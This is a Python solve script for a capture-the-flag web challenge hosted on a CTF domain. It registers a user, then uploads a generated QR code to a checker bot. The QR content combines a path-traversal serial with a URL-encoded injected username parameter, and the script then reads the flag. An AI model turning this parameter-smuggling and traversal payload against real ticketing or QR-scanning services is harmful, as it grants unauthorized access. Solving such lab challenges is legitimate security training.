import os
import random
import string
import requests
import qrcode
import time

def make_qr_code(content):
    FILENAME = "exploit.pjpg"
    image = qrcode.make(content)
    image.save(FILENAME, format='JPEG')
    return FILENAME

def random_string():
    return ''.join(random.choices(string.ascii_letters, k=8))

CHALL_URL = "https://ticket.challs.olicyber.it"

BOT_URL = CHALL_URL.replace('ticket.', 'ticket-bot.')

def check():
    
    s = requests.Session()
    username = random_string()
    password = random_string()

    r = s.post(f"{CHALL_URL}/api/v1/register/", data={
        "username": username,
        "password": password,
        "password_confirm": password
    })

    r = s.post(f"{CHALL_URL}/api/v1/login/", data={
        "username": username,
        "password": password
    })

    sToken = r.json()["session_token"]

    qrcodeImg = make_qr_code(f"serial=../concert/1/checker&comment=%26username={username}")
    r = requests.post(f"{BOT_URL}/upload/", files={"qrImage": open('exploit.pjpg', 'rb')})

    assert "Ticket correctly checked" in r.text
    time.sleep(1)

    os.unlink('exploit.pjpg')

    r = s.get(f"{CHALL_URL}/api/v1/user/concert/", headers={"Authorization": sToken}, verify=False)

    r = r.json()
    concert = r[0]
    flag = concert["secret_code"]

    print(flag)
    
if __name__ == "__main__":
    check()